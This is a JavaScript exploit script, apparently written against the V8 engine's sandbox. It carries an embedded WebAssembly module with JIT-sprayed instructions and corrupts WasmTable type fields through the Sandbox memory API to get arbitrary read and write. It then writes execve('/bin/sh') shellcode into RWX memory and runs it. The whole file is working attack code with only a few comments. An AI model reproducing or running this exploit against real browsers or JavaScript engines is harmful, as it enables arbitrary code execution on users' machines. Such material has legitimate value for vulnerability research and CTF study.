let wasmCode=new Uint8Array([0,97,115,109,1,0,0,0,1,84,11,80,0,95,1,112,1,96,0,10,126,126,126,126,126,126,126,126,126,126,96,10,126,126,126,126,126,126,126,126,126,126,10,126,126,126,126,126,126,126,126,126,126,80,0,95,1,126,1,96,1,126,1,126,96,1,100,3,1,126,96,1,126,1,126,96,2,126,126,0,96,2,100,3,126,0,96,2,126,126,0,96,0,0,3,11,10,2,1,1,5,4,6,8,7,9,10,4,31,3,64,0,100,1,1,1,1,210,1,11,64,0,100,4,1,1,1,210,4,11,64,0,100,7,1,1,1,210,7,11,5,4,1,1,1,1,7,137,1,14,4,109,101,109,48,2,0,5,102,117,110,99,48,0,0,5,102,117,110,99,49,0,1,6,116,97,98,108,101,48,1,0,4,114,101,97,100,0,2,9,97,114,98,95,102,117,110,99,48,0,3,9,97,114,98,95,102,117,110,99,49,0,4,6,116,97,98,108,101,49,1,1,7,97,114,98,114,101,97,100,0,5,10,97,114,98,95,119,114,105,116,101,48,0,6,10,97,114,98,95,119,114,105,116,101,49,0,7,6,116,97,98,108,101,50,1,2,8,97,114,98,119,114,105,116,101,0,8,5,115,104,101,108,108,0,9,10,158,1,10,22,0,32,0,32,1,32,2,32,3,32,4,32,5,32,6,32,7,32,8,32,9,11,22,0,66,0,66,0,66,0,66,0,66,0,66,0,66,0,66,0,66,0,66,0,11,7,0,65,0,17,1,0,11,8,0,32,0,251,2,3,0,11,4,0,66,0,11,9,0,32,0,65,0,17,4,1,11,10,0,32,0,32,1,251,5,3,0,11,2,0,11,11,0,32,1,32,0,65,0,17,7,2,11,52,0,68,104,47,115,104,0,88,235,12,68,104,47,98,105,110,90,235,12,68,72,193,224,32,49,246,235,12,68,72,1,208,49,210,80,235,12,68,72,137,231,106,59,88,15,5,26,26,26,26,26,11,0,100,4,110,97,109,101,1,93,10,0,5,102,117,110,99,48,1,5,102,117,110,99,49,2,4,114,101,97,100,3,9,97,114,98,95,102,117,110,99,48,4,9,97,114,98,95,102,117,110,99,49,5,7,97,114,98,114,101,97,100,6,10,97,114,98,95,119,114,105,116,101,48,7,10,97,114,98,95,119,114,105,116,101,49,8,8,97,114,98,119,114,105,116,101,9,5,115,104,101,108,108]);
var wasmModule = new WebAssembly.Module(wasmCode);
var instance = new WebAssembly.Instance(wasmModule, {});
// let instance = builder.instantiate();

let func0 = instance.exports.func0;
let table0 = instance.exports.table0;
let arb_func0 = instance.exports.arb_func0;
let table1 = instance.exports.table1;
let arb_write0 = instance.exports.arb_write0;
let table2 = instance.exports.table2;
let shell = instance.exports.shell;
let mem0 = instance.exports.mem0;

for (var i = 0; i < 0x10000; i++) {
    shell();
}

// %DebugPrint(shell);
// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 32;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
    return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
    return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}


// Corrupt the table's type to accept putting $func0 into it.
let t0 = getPtr(table0);
const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;
let expected_old_type = ((1 /*$sig_i_l*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
let new_type = ((2 /*$sig_v_struct*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
// console.log($sig_i_l);
// console.log($sig_v_struct);
setField(t0, kWasmTableObjectTypeOffset, new_type);

// This should run into a signature check that kills the process.
table0.set(0, func0);


let t1 = getPtr(table1);
let expected_old_type2 = ((4 /*$sig_i_l2*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
let new_type2 = ((5 /*$sig_v_struct2*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
// console.log($sig_i_l2);
// console.log($sig_v_struct2);
setField(t1, kWasmTableObjectTypeOffset, new_type2);

// This should run into a signature check that kills the process.
table1.set(0, arb_func0);


let t2 = getPtr(table2);
let expected_old_type3 = ((7 /*$sig_i_l3*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
let new_type3 = ((8 /*$sig_v_struct3*/ << kHeapTypeShift) | kRef) << kSmiTagSize;
// console.log($sig_i_l3);
// console.log($sig_v_struct3);
setField(t2, kWasmTableObjectTypeOffset, new_type3);

// This should run into a signature check that kills the process.
table2.set(0, arb_write0);
// If the process was still alive, this would cause the sandbox violation.
let arr = instance.exports.read();
// for (var i = 0; i < arr.length; i++) {
//     print(arr[i].toString(16));
// }
let instancedata = arr[2];
console.log(instancedata.toString(16));

let rwx = instance.exports.arbread(instancedata + 0x30n);
console.log(rwx.toString(16));
// instance.exports.arbwrite(instancedata + 0x30n, rwx+0x95en);
let shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

instance.exports.arbwrite(rwx - 7n, shellcode[0]);
instance.exports.arbwrite(rwx - 7n + 8n, shellcode[1]);
instance.exports.arbwrite(rwx - 7n + 16n, shellcode[2]);
func0(0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n,);